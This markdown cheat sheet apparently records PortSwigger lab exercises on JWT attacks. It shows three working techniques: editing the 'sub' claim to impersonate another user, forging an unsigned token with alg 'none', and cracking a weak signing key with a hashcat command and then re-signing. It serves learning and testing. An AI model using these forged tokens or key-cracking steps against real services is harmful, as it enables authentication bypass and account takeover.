---
title: JWT attacks
description: Poor implementation of JWT can be used to bypass authentication and access control
---
## JWT Format
- **header**: metadata about the token
- **payload**: claim about the data or user
- **signature**:  header and payload are encoded, then signed with a secret key to prevent tampering.
## Exploit
### Signature not verified
Make changes to the payload, like changing to a different user. 
```http
{  
    "iss": "portswigger",  
    "exp": 1747553975,  
    "sub": "wiener"  
}
```
Change user:
```http
{  
    "iss": "portswigger",  
    "exp": 1747553975,  
    "sub": "carlos"  
}
```
### Unsigned JWT
Server can be setup incorrectly and it can accepts unsigned JWTs.
Use burpsuite **JSON Web Token** extensions to remove the signature. 

It removes the signature. The header now looks like this:
```http
{  
    "typ": "JWT",  
    "alg": "none"  
}
```

JWT with no signature:
```http
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0NzU1NDQ3MCwic3ViIjoid2llbmVyIn0.
```
### Weak signing key
Use **hashcat** to try to brute-force the secret key.
```bash
hashcat -a 0 -m 16500 eyJraWQiOiI0ODY2MTZhOC1lM2I0LTQzZWItODQ3Mi04NTc1OTgzNWJhNTkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0NzU1NDc1NSwic3ViIjoid2llbmVyIn0._75lGMCWEJRNqs-mH0KCZ4IDodeS3IEQFPhUZOGKDNk rockyou.txt
```

Create a new signing key with the cracked secret key.
1. Burp Suite > JWT Editor > New Symmetric Key
2. Specify secret > Generate
3. Go to JSON Web token, change the payload and sign with new key.